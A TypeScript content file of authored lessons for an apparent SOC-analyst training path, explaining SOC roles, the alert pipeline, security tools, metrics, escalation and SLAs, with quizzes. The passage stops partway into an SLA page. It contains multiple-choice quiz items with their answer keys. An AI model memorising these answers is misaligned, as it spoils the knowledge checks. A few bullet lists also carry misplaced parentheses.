import type { AuthoredPathLesson } from "./types";

/** Authored Learning Path content — group "sa1". Keys: "<pathSlug>--<lessonSlug>". */
export const lessons_sa1: Record<string, AuthoredPathLesson> = {
  "soc-analyst--what-is-a-soc": {
    "pages": [
      {
        "pageNumber": 1,
        "video": {
          "src": "/lesson-videos/what-is-a-soc/what-is-a-soc.mp4",
          "caption": "Explainer: What is a SOC? · subtitles: English · עברית · Español (CC menu)",
          "tracks": [
            { "srclang": "en", "label": "English", "src": "/lesson-videos/what-is-a-soc/en.vtt", "default": true },
            { "srclang": "he", "label": "עברית", "src": "/lesson-videos/what-is-a-soc/he.vtt" },
            { "srclang": "es", "label": "Español", "src": "/lesson-videos/what-is-a-soc/es.vtt" }
          ]
        },
        "title": "What a SOC Is (and Why It Exists)",
        "body": "A **Security Operations Center (SOC)** is the team, the processes, and the technology an organization uses to continuously watch its systems for signs that someone is trying to break in, steal data, or disrupt operations, and to respond when they find one. If you have ever seen a bank lobby with a wall of camera monitors and a guard watching them around the clock, you already understand the core idea. A SOC is that security desk, except instead of watching hallways and doors, it watches endpoints, servers, cloud accounts, network traffic, and identity systems. The \"alert\" that appears on an analyst's screen is the digital equivalent of a motion sensor tripping or a door being forced open.\n\n### Why \"continuously\" matters\nAttackers do not work business hours. A SOC that only watches from 9-to-5 leaves sixteen hours a day, plus weekends, completely unguarded, which is exactly when many real intrusions happen, because attackers know defenders are more likely to be asleep. That is why mature SOCs run **24/7/365**, either with staff physically present around the clock, with automated detection plus an on-call rotation, or with a managed provider covering the gaps. The core commitment is the same either way: something is always watching.\n\n### What a SOC actually watches\nA SOC's visibility typically spans:\n- **Endpoints** (laptops, servers, workstations (via EDR agents)\n- **Network**) traffic between systems, north-south and east-west\n- **Identity** (logins, privilege changes, authentication failures\n- **Cloud**) SaaS applications, cloud infrastructure, APIs\n- **Applications**, web apps, databases, custom business systems\n\n### SOC vs. IT helpdesk\nThese are often confused by newcomers. An IT helpdesk exists to keep systems *working*: password resets, broken printers, slow laptops. A SOC exists to keep systems *safe*. It assumes systems are already working and asks a different question: is anyone in here who shouldn't be? The two teams frequently hand off to each other (a SOC analyst might ask helpdesk to reimage a compromised laptop), but their missions are distinct, and conflating them is a common first-week mistake.\n\nBy the end of this lesson you will be able to describe what a SOC monitors, why it runs continuously, and how it differs from general IT support: the foundation every later lesson in this path builds on.",
        "keyPoints": [
          "A SOC is the people, process, and technology that continuously monitor an organization for signs of compromise",
          "SOCs run 24/7/365 because attackers do not respect business hours",
          "Typical SOC visibility spans endpoints, network, identity, cloud, and applications",
          "A SOC keeps systems safe; an IT helpdesk keeps systems working: different missions"
        ]
      },
      {
        "pageNumber": 2,
        "title": "People: Who Works in a SOC",
        "body": "A SOC is fundamentally a team of people, organized around a division of labor that lets junior analysts handle volume while senior specialists handle depth. This lesson gives you the map; the next lesson in this module goes deep on how the tiers actually work and how SLAs (Service Level Agreements) govern them.\n\n### The core roles\n- **Tier 1 (T1) Analyst**: the frontline. Monitors the SIEM (Security Information and Event Management platform) and EDR (Endpoint Detection and Response) console, performs first-pass triage on incoming alerts, and either closes them as benign or escalates them with context. This is where almost every SOC career starts, including yours.\n- **Tier 2 (T2) Analyst**. Receives escalations from T1, performs deeper investigation, correlates evidence across multiple log sources, and coordinates the technical response to confirmed incidents.\n- **Tier 3 (T3) Analyst / Threat Hunter**. Handles the most complex cases: advanced malware analysis, proactive threat hunting (looking for attackers the automated detections missed), and leading major incident response.\n- **Detection Engineer**. Writes and tunes the detection rules (often in Sigma or a vendor-specific query language) that generate the alerts T1 triages. A SOC with weak detection engineering drowns its analysts in noise.\n- **SOC Manager**. Owns staffing, shift coverage, SLA compliance, and reporting to leadership.\n- **Incident Responder**, often a T2/T3 specialization, leads containment and eradication during a confirmed breach, working closely with legal, HR, and executive stakeholders.\n\n### Why you start at Tier 1\nTier 1 is not \"lesser\" work. It is the filter that makes the rest of the SOC possible. A large enterprise SIEM can generate thousands of alerts a day; without a disciplined first pass, T2 and T3 would drown before they ever reached a real investigation. Every skill you build at T1 (reading a process tree, recognizing a false positive, writing a clear ticket) is the exact skill a T2 investigation depends on later.\n\n### A note on structure\nNot every organization uses exactly three tiers, and titles vary by company (some use \"SOC Analyst I/II/III,\" others \"Associate/Analyst/Senior Analyst\"). What matters is the underlying pattern: volume and speed at the front, depth and judgment further back. Keep that pattern in mind. It recurs throughout this path.",
        "keyPoints": [
          "SOC roles divide labor: T1 handles volume and speed, T2/T3 handle depth and judgment",
          "Tier 1 triages alerts first; Tier 2 investigates escalations; Tier 3 hunts and handles major incidents",
          "Detection Engineers write the rules that generate what T1 sees. Quality here reduces noise for everyone",
          "Titles vary by organization, but the tiered pattern of increasing depth is consistent across the industry"
        ]
      },
      {
        "pageNumber": 3,
        "title": "Process: How an Alert Becomes a Verdict",
        "body": "Behind every SOC is a repeatable process: a pipeline that takes a raw signal and turns it into a documented decision. Understanding this pipeline is more important than memorizing any single tool, because tools change but the workflow does not.\n\n### The five stages\n1. **Detection**: a rule, model, or sensor fires because something matched a pattern (a process spawned, a login occurred from an unusual country, a file hash matched a known-bad list).\n2. **Triage**, a human (usually T1) looks at the alert and makes a fast initial call: is this worth investigating further, or can it be closed immediately as expected/benign activity?\n3. **Investigation**, if triage says \"worth investigating,\" the analyst gathers more context: related events, the user or host history, threat intelligence on any indicators involved.\n4. **Response / Containment**, if the investigation confirms malicious or suspicious activity, action is taken: isolating a host, disabling an account, blocking an indicator at the firewall.\n5. **Closure & Documentation**: every alert, regardless of verdict, gets a documented outcome. This is not paperwork for its own sake. It is the organization's memory, used for metrics, audits, and catching patterns across incidents.\n\n### Visualizing the pipeline\nThe diagram below shows the flow, including the branch point where most alerts exit early (as benign) rather than proceeding all the way to containment. In a healthy SOC, the vast majority of alerts are closed at triage. That is the system working as intended, not a sign of laziness.\n\n### Why order matters\nSkipping stages causes real damage. Containing a host before investigation confirms the scope can alert a sophisticated attacker that they have been spotted, causing them to accelerate or hide deeper (this is sometimes discussed under the idea of tipping off an adversary). Skipping documentation means the next analyst who sees a similar alert has no history to learn from. The pipeline exists precisely because skipping steps under time pressure is the natural failure mode for a tired analyst at 3 a.m.",
        "codeExample": "flowchart TD\n    A[Detection: rule or sensor fires] --> B[Triage: T1 reviews the alert]\n    B -->|Benign / expected activity| E[Closure: document verdict]\n    B -->|Needs more context| C[Investigation: gather evidence, correlate sources]\n    C -->|Confirmed malicious or suspicious| D[Response: contain, isolate, block]\n    C -->|Determined benign after review| E\n    D --> E",
        "keyPoints": [
          "The alert pipeline runs Detection to Triage to Investigation to Response to Closure",
          "Most alerts exit at Triage as benign: that is the pipeline working correctly, not a shortcut",
          "Containing before investigating can tip off an attacker and accelerate their actions",
          "Every alert gets a documented verdict, which becomes the SOC's institutional memory"
        ]
      },
      {
        "pageNumber": 4,
        "title": "Technology: The SOC Toolstack",
        "body": "A SOC's people follow a process, but that process runs on top of a specific stack of tools. Knowing what each tool answers, not just its name, is what separates someone who can operate a SOC from someone who has only memorized acronyms.\n\n### The core tools\n| Tool | Full name | What it answers |\n|---|---|---|\n| **SIEM** | Security Information and Event Management | \"Across all my log sources, what happened and when?\" Aggregates and correlates logs from firewalls, servers, identity systems, and more into searchable, alertable data. Examples: Splunk, Microsoft Sentinel. |\n| **EDR** | Endpoint Detection and Response | \"What exactly happened on this specific laptop or server?\" Deep visibility into process execution, file activity, and network connections on individual hosts. Examples: CrowdStrike Falcon, Microsoft Defender for Endpoint. |\n| **SOAR** | Security Orchestration, Automation and Response | \"Can a machine do the repetitive first steps for me?\" Automates playbooks, for example, automatically enriching an IP address with threat intelligence the moment an alert fires. |\n| **TIP** | Threat Intelligence Platform | \"Has anyone else seen this indicator before, and what do we know about it?\" Aggregates indicators of compromise (IOCs) and context from external and internal sources. |\n| **NDR** | Network Detection and Response | \"What does the traffic between systems look like?\" Analyzes network flows and packets for anomalies that endpoint tools cannot see, such as lateral movement between two servers with no EDR agent. |\n| **Ticketing / ITSM** | IT Service Management | \"What is the documented record of this alert and what was done about it?\" Tracks every case from open to close. |\n\n### SIEM vs. EDR: the distinction that trips up beginners\nThese two are the most commonly confused. A SIEM is broad and shallow by default. It ingests logs from dozens of sources but usually only gets a summary of what happened. An EDR is narrow and deep. It only watches endpoints, but it captures rich detail: the full process tree, every command-line argument, every file touched. A mature SOC forwards EDR alerts and telemetry into the SIEM so analysts can correlate endpoint activity with everything else (a suspicious login from the same user, an unusual DNS lookup) in one place.\n\n### No single tool tells the whole story\nAn analyst who only looks at the SIEM misses the endpoint detail. An analyst who only looks at EDR misses the wider context of what else the user or IP did. Real investigations pivot between tools: a skill this path builds deliberately across later lessons.",
        "codeExample": "flowchart LR\n    EP[Endpoints] -->|telemetry| EDR[EDR agent]\n    NET[Network] -->|flow logs| NDR[NDR sensor]\n    ID[Identity systems] -->|auth logs| SIEM\n    EDR -->|forwarded alerts| SIEM[SIEM]\n    NDR -->|forwarded alerts| SIEM\n    TIP[Threat Intel Platform] -->|IOC enrichment| SIEM\n    SIEM -->|correlated alert| Analyst\n    SOAR[SOAR playbook] -->|auto-enrichment| Analyst",
        "keyPoints": [
          "SIEM = broad visibility across many log sources; EDR = deep visibility on individual endpoints",
          "SOAR automates repetitive playbook steps like IOC enrichment before an analyst even opens the alert",
          "A TIP tells you whether an indicator has been seen elsewhere and what context exists on it",
          "Mature SOCs forward EDR and NDR alerts into the SIEM so analysts correlate everything in one place"
        ]
      },
      {
        "pageNumber": 5,
        "title": "SOC Delivery Models: In-House, MSSP, and Hybrid",
        "body": "Not every organization builds and staffs its own SOC. There are three common delivery models, and understanding them helps you understand who you might work for and how responsibilities are split.\n\n### In-house SOC\nThe organization hires, trains, and manages its own analysts, using tools it owns or licenses directly. This gives maximum control and the deepest institutional knowledge of the environment, but it is expensive and hard to staff around the clock, 24/7 coverage with in-house staff alone typically requires at least four shift teams to cover nights, weekends, and time off without burning people out.\n\n### MSSP (Managed Security Service Provider)\nAn external company monitors the organization's environment, often for many clients simultaneously from a shared operations floor. This is far more cost-effective for small and mid-sized organizations that cannot justify a dedicated internal team, and it provides 24/7 coverage immediately. The tradeoff is depth: an MSSP analyst juggling alerts from a dozen different clients has less specific context about any one environment than a dedicated in-house analyst would.\n\n### Hybrid model\nMany mid-to-large organizations split the difference: an in-house team (often just T2/T3, detection engineering, and incident response leadership) handles the deep, environment-specific work, while an MSSP or a co-managed arrangement covers overnight and weekend Tier 1 monitoring. This is increasingly the most common real-world pattern, because it captures the 24/7 coverage benefit of an MSSP without losing all institutional depth.\n\n### Follow-the-sun coverage\nA related concept used by large multinational organizations and larger MSSPs: rather than one team working night shifts, three or more teams are staffed across time zones (for example, one in the Americas, one in EMEA, one in APAC) so that each analyst always works during their local daytime, and the alert queue simply \"follows the sun\" around the globe as each region's business hours begin.\n\n### Why this matters to you as an analyst\nThe delivery model shapes your day-to-day reality. An MSSP analyst context-switches between many client environments and relies heavily on documented runbooks per client. An in-house analyst goes deeper on fewer systems but has to build and maintain that expertise themselves. Neither is \"better\", they are different jobs solving the same coverage problem.",
        "keyPoints": [
          "In-house SOCs give maximum environment-specific depth but are expensive to staff 24/7",
          "An MSSP (Managed Security Service Provider) offers immediate 24/7 coverage across many clients, at the cost of per-client depth",
          "Hybrid models combine in-house depth with MSSP or co-managed overnight coverage: the most common real-world pattern",
          "Follow-the-sun staffing uses time-zone-distributed teams so no single team works permanent night shifts"
        ]
      },
      {
        "pageNumber": 6,
        "title": "Metrics That Matter (a First Look)",
        "body": "A SOC that cannot measure itself cannot improve, and cannot prove its value to the leadership that funds it. This page introduces the two metrics you will hear most often; the next lesson in this module covers them in full depth, including exact formulas and how they interact with SLAs.\n\n### Mean Time to Detect (MTTD)\nThe average time between when a compromise or malicious event actually begins and when the SOC's tools or analysts detect it. A shorter MTTD generally means the attacker had less time to move, escalate privileges, or exfiltrate data before being noticed.\n\n### Mean Time to Respond (MTTR)\nThe average time between detection and containment or resolution. A shorter MTTR means less damage accumulates after the SOC already knows something is wrong.\n\n### Why these two together, not separately\nMTTD and MTTR measure different halves of the same timeline: MTTD is \"how long were we blind,\" MTTR is \"how long did we take to act once we could see.\" An organization can have excellent MTTD (fast detection) but terrible MTTR (slow response) if analysts are overwhelmed or containment requires too many manual approvals, and the reverse is also possible. Neither number alone tells the full story.\n\n### Other metrics that matter\n- **Alert volume**. How many alerts the SOC receives per day/shift, a proxy for both attack surface and detection-rule noise.\n- **False positive rate**: the proportion of alerts that turn out to be benign; too high, and it produces alert fatigue (covered in depth two lessons from now).\n- **Escalation rate**, the proportion of T1 alerts that get escalated to T2, a useful signal of whether T1 triage criteria are well-calibrated.\n- **Dwell time**. Closely related to MTTD, the total time an attacker's presence went unnoticed in the environment.\n\n### A word of caution\nMetrics can be gamed. An analyst under pressure to hit a fast MTTR might close alerts too quickly without proper investigation, artificially improving the number while making the SOC genuinely worse at its job. Good SOC leadership pairs speed metrics like MTTD/MTTR with quality metrics (escalation accuracy, missed-detection reviews) so that \"fast\" and \"correct\" are both rewarded.",
        "keyPoints": [
          "MTTD (Mean Time to Detect) measures how long a compromise went unnoticed before detection",
          "MTTR (Mean Time to Respond) measures how long it took to contain or resolve after detection",
          "Alert volume, false positive rate, and escalation rate round out a fuller picture of SOC health",
          "Speed metrics alone can be gamed: pair them with quality metrics to avoid rewarding rushed, sloppy triage"
        ]
      },
      {
        "pageNumber": 7,
        "title": "A Shift in the Life: Walking Through an Alert",
        "body": "Concepts click faster with a concrete story. Meet NexaCorp, a fictional mid-sized company whose SOC you will follow throughout this path.\n\n### 02:14: the alert fires\nIt is the middle of the night shift. A CrowdStrike Falcon detection fires on **FIN-WKS-0231**, a workstation in the Finance department. The detection shows a Microsoft Word process (winword.exe) spawning powershell.exe with a long base64-encoded command-line argument. The detection's Tactic field reads \"Defense Evasion,\" and its Technique field reads \"Obfuscated Files or Information.\"\n\n### 02:15. Tier 1 picks it up\nMaya, a Tier 1 analyst three months into the job, sees the alert land in the SIEM's queue. She does not touch the host yet. First she checks the process tree, confirms the parent-child relationship (Word spawning PowerShell is a known phishing macro pattern, not normal user behavior), and checks whether the user, David in Accounts Payable, had recently opened an email attachment. He had: an invoice.pdf.exe-adjacent attachment ten minutes earlier.\n\n### 02:17. Triage decision\nApplying the pipeline from page 3, Maya moves past \"Detection\" into \"Triage\" and decides this needs investigation. Word spawning PowerShell with obfuscation is not expected behavior for an invoice attachment. She does not have containment authority at her tier for this severity, so she begins building an escalation package: the alert, the process tree, the phishing email, and a timeline of the last twenty minutes.\n\n### 02:22. Escalation to Tier 2\nMaya escalates to the on-call Tier 2 analyst with full context attached: no \"please look into this,\" but a documented narrative a T2 analyst can act on immediately. This is the difference a good escalation makes, and it is a skill this path deliberately builds toward.\n\n### What this walkthrough previews\nEvery concept in this lesson touched this one scenario: the toolstack (EDR alert, SIEM queue), the process (detection through escalation), the people (T1 handling triage, T2 receiving it), and the metrics ticking in the background (the clock on MTTD started the moment the phishing email executed, not the moment Maya saw the alert).",
        "keyPoints": [
          "A single alert touches every concept in this lesson: people, process, technology, and metrics at once",
          "Good triage means gathering context (process tree, user activity) before deciding, not reacting instantly",
          "A strong escalation package tells the receiving analyst what happened, not just that something happened",
          "The MTTD clock starts at the actual compromise, not at the moment an analyst notices the alert"
        ]
      },
      {
        "pageNumber": 8,
        "title": "Where This Path Goes From Here",
        "body": "This lesson gave you the map of the SOC world: what it is, who works in it, how the alert pipeline flows, what tools power it, how organizations structure delivery, and the metrics that measure success. Every remaining lesson in this Learning Path builds directly on this foundation, so it is worth being explicit about what comes next and why.\n\n### Next: the tier model and SLAs, in depth\nYou saw Tier 1, Tier 2, and Tier 3 mentioned here at a high level. The next lesson goes deep: what exactly separates the tiers day-to-day, what makes an escalation package genuinely useful versus useless, what a Service Level Agreement (SLA) is and how it is structured by severity, and the precise formulas behind MTTD and MTTR that were only introduced here.\n\n### Then: mental models for triage\nMaya's 02:14 decision in the walkthrough above was not guesswork. It followed a repeatable way of thinking. The lesson after tiers and SLAs teaches that thinking directly: the difference between a true positive, a false positive, and a benign true positive, how alert fatigue develops, and a structured checklist you can apply to any alert you have never seen before.\n\n### Then: a knowledge check\nA short quiz lesson closes out this module, reviewing everything from SOC structure through triage mindset before this path moves into reading EDR alerts and process trees in the next module, Alert Triage.\n\n### The pattern to notice\nNotice how this path is built: broad orientation first (this lesson), then depth on people and process (tiers and SLAs), then depth on decision-making (triage mental models), then a checkpoint, then hands-on technical skill (reading real EDR alert data). That sequencing is deliberate, you cannot triage well without knowing what a good triage decision looks like, and you cannot read an alert well without knowing what question you are trying to answer with it. Keep this sequence in mind as a study strategy: if a later lesson feels confusing, the answer is often to revisit the foundational concept it assumes you already have, rather than to push forward.",
        "keyPoints": [
          "The tier model and SLA lesson next will deepen everything introduced here about T1/T2/T3 and metrics",
          "The mental models for triage lesson teaches the decision-making Maya used in the walkthrough",
          "A knowledge-check quiz consolidates this module before the path moves into technical EDR skills",
          "This path is sequenced deliberately: orientation, then people/process depth, then decision-making, then technical skill"
        ]
      }
    ],
    "quiz": [
      {
        "question": "What is the core distinction between a SOC and a general IT helpdesk?",
        "options": [
          {
            "label": "A SOC keeps systems safe from compromise; a helpdesk keeps systems working for users",
            "value": "a"
          },
          {
            "label": "A SOC only works business hours while a helpdesk works 24/7",
            "value": "b"
          },
          {
            "label": "A SOC handles password resets while a helpdesk handles security alerts",
            "value": "c"
          },
          {
            "label": "There is no real distinction: most companies use the two terms completely interchangeably in practice",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "A SOC's mission is detecting and responding to compromise, while a helpdesk's mission is keeping systems operational for end users (password resets, hardware issues). The two teams often coordinate, but their core missions differ. It is actually the SOC that typically runs continuously, not the helpdesk, so the hours-based distractor has it backwards."
      },
      {
        "question": "A new analyst needs to know exactly which files, registry keys, and command-line arguments a single suspicious workstation touched in the last hour. Which tool is built to answer that specific question?",
        "options": [
          {
            "label": "SIEM, because it aggregates logs from every source into one place",
            "value": "a"
          },
          {
            "label": "EDR, because it gives deep, host-level process and file visibility",
            "value": "b"
          },
          {
            "label": "SOAR, because it automates playbook actions",
            "value": "c"
          },
          {
            "label": "TIP, because it stores threat intelligence indicators",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "EDR (Endpoint Detection and Response) is the tool built for deep, per-host visibility: process trees, file activity, and command-line detail on a specific endpoint. A SIEM is broad but comparatively shallow, correlating many sources without EDR-level endpoint depth; it would not be the first place to look for one workstation's granular file and process history."
      },
      {
        "question": "In the standard SOC alert pipeline, what should typically happen immediately before a host is contained or isolated?",
        "options": [
          {
            "label": "Closure and documentation",
            "value": "a"
          },
          {
            "label": "Detection by a rule or sensor",
            "value": "b"
          },
          {
            "label": "Investigation to confirm scope and malicious intent",
            "value": "c"
          },
          {
            "label": "Escalation to the SOC manager for budget approval before any technical work can begin",
            "value": "d"
          }
        ],
        "answer": "c",
        "explanation": "The pipeline flows Detection, Triage, Investigation, Response/Containment, Closure. Investigation should confirm what is actually happening before containment is taken, because acting too early, before scope is understood, risks tipping off an attacker or disrupting business operations unnecessarily. Closure happens after response, not before it."
      },
      {
        "question": "A mid-sized company cannot afford to staff a 24/7 internal SOC team, but wants continuous overnight and weekend monitoring without giving up all in-house expertise on its own environment. Which delivery model fits best?",
        "options": [
          {
            "label": "A hybrid model, combining in-house depth with MSSP or co-managed overnight coverage",
            "value": "d"
          },
          {
            "label": "A fully in-house SOC with a single daytime-only team",
            "value": "a"
          },
          {
            "label": "A pure MSSP model with no internal security staff at all",
            "value": "b"
          },
          {
            "label": "Follow-the-sun staffing that relies exclusively on internal employees spread across three continents",
            "value": "c"
          }
        ],
        "answer": "d",
        "explanation": "A hybrid model is designed exactly for this tradeoff: it keeps in-house staff (often T2/T3 and detection engineering) for environment-specific depth while using an MSSP (Managed Security Service Provider) or co-managed arrangement to cover the hours the internal team cannot staff. A daytime-only in-house team leaves gaps; a pure MSSP loses institutional depth; internal follow-the-sun staffing requires the very headcount the company cannot afford."
      },
      {
        "question": "A CrowdStrike Falcon detection fires at 2 a.m. showing winword.exe spawning powershell.exe with an obfuscated command line, on a host whose user opened an email attachment ten minutes earlier. According to the pipeline and metrics covered in this lesson, when did the MTTD clock actually start?",
        "options": [
          {
            "label": "When the analyst opened the alert in the SIEM queue",
            "value": "a"
          },
          {
            "label": "When the analyst finished writing and submitting the full escalation package to Tier 2",
            "value": "b"
          },
          {
            "label": "When the phishing attachment executed and the compromise began",
            "value": "c"
          },
          {
            "label": "When Tier 2 accepted the escalation",
            "value": "d"
          }
        ],
        "answer": "c",
        "explanation": "Mean Time to Detect (MTTD) measures the gap between when a compromise actually begins and when it is detected, so the clock starts at the malicious event itself (the attachment executing), not at any later point in the analyst's workflow. Confusing 'when the analyst noticed' with 'when it began' is a common beginner mistake that understates true detection latency."
      }
    ]
  },
  "soc-analyst--tier-model-and-slas": {
    "pages": [
      {
        "pageNumber": 1,
        "video": {
          "src": "/lesson-videos/tier-model-and-slas/tier-model-and-slas.mp4",
          "caption": "Explainer, Tier Model & SLAs · subtitles: English · עברית · Español (CC menu)",
          "tracks": [
            { "srclang": "en", "label": "English", "src": "/lesson-videos/tier-model-and-slas/en.vtt", "default": true },
            { "srclang": "he", "label": "עברית", "src": "/lesson-videos/tier-model-and-slas/he.vtt" },
            { "srclang": "es", "label": "Español", "src": "/lesson-videos/tier-model-and-slas/es.vtt" }
          ]
        },
        "title": "The Three-Tier Analyst Model, In Depth",
        "body": "The previous lesson introduced Tier 1, Tier 2, and Tier 3 at a glance. This lesson goes deep on what actually separates them day-to-day, because understanding the boundaries between tiers is what lets you escalate correctly instead of either sitting on something too long or dumping every alert on someone busier than you.\n\n### Tier 1: speed and first judgment\nTier 1 (T1) analysts monitor the SIEM (Security Information and Event Management) and EDR (Endpoint Detection and Response) queues continuously, applying documented playbooks and standard operating procedures to perform an initial verdict on every alert: is this expected activity, an obvious false positive, or something that warrants deeper investigation? T1 typically has authority to close low-risk alerts outright but not to take containment actions like isolating a host or disabling a domain administrator account. Most SOC careers start here, and typical tenure before promotion is measured in months to a couple of years depending on the organization.\n\n### Tier 2: depth and correlation\nTier 2 (T2) analysts receive escalations from T1 and perform the investigation T1 could not: correlating events across multiple log sources, pulling in threat intelligence context, determining the actual scope and impact of an incident, and coordinating the technical response, including containment actions T1 typically cannot authorize alone. T2 analysts commonly hold two to five years of SOC experience and certifications such as GCIH (GIAC Certified Incident Handler) or CySA+ (CompTIA Cybersecurity Analyst).\n\n### Tier 3: hunting and leadership\nTier 3 (T3) analysts, sometimes titled threat hunters or senior incident responders, handle the hardest cases: advanced malware analysis, proactively hunting for attackers that automated detections missed entirely, leading major incident response, and feeding lessons learned back into detection engineering so the same gap does not recur.\n\n### The boundary is about authority and depth, not effort\nA common misconception is that tiers reflect how \"hard\" someone works. In reality they reflect scope of authority (what actions you can take unilaterally) and depth of investigation (how many sources and how much time a case justifies). A T1 analyst working a genuinely difficult false-positive investigation for twenty minutes is not doing \"T2 work\". They are doing excellent T1 work within their scope.",
        "keyPoints": [
          "Tier 1 performs fast first-pass triage with documented playbooks but limited containment authority",
          "Tier 2 investigates escalations in depth, correlates multiple sources, and coordinates technical response",
          "Tier 3 hunts for undetected threats, handles advanced malware, and leads major incidents",
          "Tiers differ by scope of authority and investigation depth, not by how hard an analyst works"
        ]
      },
      {
        "pageNumber": 2,
        "title": "Escalation: Handing Off With Context",
        "body": "An escalation is only as useful as the context that travels with it. A poor escalation costs the receiving analyst time they do not have; a good one lets them act immediately.\n\n### What a strong escalation package contains\n- **The alert itself**: the raw detection, including relevant fields (process name, command line, hash, source IP)\n- **Why it looked suspicious** (the specific reasoning, not just \"this seemed weird\"\n- **A timeline**) what happened, in order, with timestamps\n- **Related activity already gathered**. Other alerts on the same host/user, any threat intel lookups already done\n- **Actions already taken** (has the account been flagged, has anyone contacted the user\n- **A recommended next step**) the T1 analyst's own read on what should happen next, even though the T2 analyst makes the final call\n\n### Weak escalation vs. strong escalation\nA weak escalation looks like: *\"Suspicious PowerShell on FIN-WKS-0231, please check.\"* The receiving T2 analyst now has to start from zero. Pull the alert themselves, find the host, reconstruct the timeline, and figure out why it was flagged in the first place.\n\nA strong escalation looks like: *\"FIN-WKS-0231 (user: David, Accounts Payable). At 02:04 the user opened an email attachment named invoice_0847.pdf.exe. At 02:14, CrowdStrike Falcon detected winword.exe spawning powershell.exe with a base64-encoded command line (Tactic: Defense Evasion, Technique: Obfuscated Files or Information). No other alerts on this host in the last 30 days. I have not taken containment action. Recommend network isolation given the phishing-macro pattern. Escalating for T2 review and possible containment authorization.\"*\n\n### Why this skill compounds\nEvery lesson later in this path that touches investigation (building timelines, pivoting on entities, mapping alerts to MITRE ATT&CK) is, in effect, teaching you how to build better escalation packages. The habit of narrating *why* something is suspicious, not just *that* it is, is the single highest-leverage skill a junior analyst can build, because it is visible to every senior analyst who ever reads your tickets.",
        "keyPoints": [
          "A strong escalation includes the alert, reasoning, timeline, prior context, actions taken, and a recommendation",
          "A weak escalation forces the receiving analyst to redo the T1 analyst's work from scratch",
          "Narrating why something is suspicious (not just flagging that it is) is the highest-leverage analyst habit",
          "Escalation quality is visible and compounding: it shapes how senior analysts perceive a junior analyst's judgment"
        ]
      },
      {
        "pageNumber": 3,
        "title": "What Is an SLA?",
        "body": "A **Service Level Agreement (SLA)** is a committed target for how quickly the SOC will act on an alert, tied to how severe that alert is judged to be. SLAs exist because \"as fast as possible\" is not a measurable commitment: a business (or a client, in an MSSP context) needs a concrete number to plan around and to hold the SOC accountable to.\n\n### The three SLA clocks\nMost SOC SLAs are built around three distinct time windows, each starting at a different point:\n- **Time to Acknowledge**, from alert creation to a human confirming they have seen it and started work\n- **Time to Respond**, from acknowledgment to the first substantive triage or investigative action\n- **Time to Resolve**, from acknowledgment to the case reaching a documented verdict and, if needed, containment\n\n### Why SLAs are tiered by severity\nNot every alert deserves the same urgency. A Critical alert (say, evidence of active ransomware encryption) demands a response measured in minutes. A Low-severity alert (a single failed login from an employee's usual location) can reasonably wait hours without meaningful risk increasing. Tying SLA targets to severity ensures the SOC's fastest attention goes where it matters most, rather than spreading effort evenly across alerts of wildly different real-world urgency.\n\n### SLAs shape staffing and process, not just individual behavior\nAn SLA is not just a target for one analyst to hit on one ticket. It is a design constraint for the whole SOC. If a Critical SLA promises a 15-minute response at any hour, the SOC must staff shifts (or an on-call rotation) capable of actually delivering that, every single night, not just during business hours. This is why SLA design and the tier/staffing model from the earlier page are tightly linked: an SLA the SOC cannot realistically staff for is worse than no SLA at all, because it creates a false sense of security for the business that depends on it.\n\n### SLAs are a business commitment, not a technical fact\nIt is worth being explicit: there is no universal, industry-mandated number for how fast a \"Medium\" alert must be handled. Each organization (or MSSP contract) defines its own SLA table based on its risk tolerance, regulatory obligations, and budget. The next page walks through what such a table typically looks like.",
        "keyPoints": [
          "An SLA (Service Level Agreement) commits the SOC to specific response speed targets by severity",
          "The three SLA clocks are Time to Acknowledge, Time to Respond, and Time to Resolve",
          "Tiering SLAs by severity focuses the fastest response where real-world urgency is highest",
          "SLA targets must be backed by real staffing capacity: an unstaffable SLA is worse than none"
        ]
      },
      {
        "pageNumber": 4,
        "title": "MTTD and MTTR: Measuring the Clock",
        "body": "The previous lesson introduced Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR) briefly. Here is the full picture, including how they are actually calculated and how they interact with the SLA concept from the last page.\n\n### Mean Time to Detect (MTTD)\nMTTD measures the average gap between when a malicious event actually begins and when the SOC detects it. Formally:\n\nMTTD = (sum of detection times across all incidents) / (number of incidents)\n\nwhere each incident's \"detection time\" is (time detected) minus (time the compromise actually began). A shorter MTTD means less time for an attacker to move laterally, escalate privileges, or exfiltrate data undetected. This undetected window is sometimes called **dwell time**.\n\n### Mean Time to Respond (MTTR)\nMTTR measures the average gap between detection and containment or resolution:\n\nMTTR = (sum of response times across all incidents) / (number of incidents)\n\nwhere each incident's \"response time\" is (time resolved/contained) minus (time detected). This is the half of the timeline the SLA structure from the previous page most directly governs. SLA \"Time to Resolve\" targets are, in effect, an organization's stated goal for MTTR by severity tier.\n\n### Why they must be read together\nConsider two SOCs. SOC A detects compromises quickly (low MTTD) but takes hours to act on them (high MTTR) because approvals are slow. SOC B is slower to detect (high MTTD, perhaps due to gaps in log coverage) but acts within minutes once it does (low MTTR). Neither number alone tells you which SOC actually limits attacker damage better. You have to look at the combined window from compromise to containment.\n\n### Where the numbers actually come from\nBoth metrics require reliable timestamps at each stage: the true start of compromise (often reconstructed after the fact from forensic timeline work, covered later in this path), the detection timestamp (from the SIEM/EDR), and the containment timestamp (from the ticketing system or SOAR playbook log). Inaccurate or missing timestamps (for example, an analyst forgetting to log when containment actually happened) quietly corrupts these metrics, which is one reason disciplined documentation habits from page 2 matter beyond any single ticket.",
        "codeExample": "-- Example: average MTTR in minutes by severity, from a ticketing system export\n-- (illustrative SPL-style query against a case management index)\nindex=soc_tickets status=closed\n| eval response_minutes = (resolved_time - detected_time) / 60\n| stats avg(response_minutes) as avg_MTTR_minutes by severity\n| sort severity",
        "keyPoints": [
          "MTTD = average time from actual compromise start to detection; lower means shorter attacker dwell time",
          "MTTR = average time from detection to containment/resolution; lower means less post-detection damage",
          "SLA 'Time to Resolve' targets are effectively an organization's stated MTTR goal per severity tier",
          "Both metrics depend on accurate timestamps. Sloppy documentation quietly corrupts the numbers"
        ]
      },
      {
        "pageNumber": 5,
        "title": "Building an SLA Table by Severity",
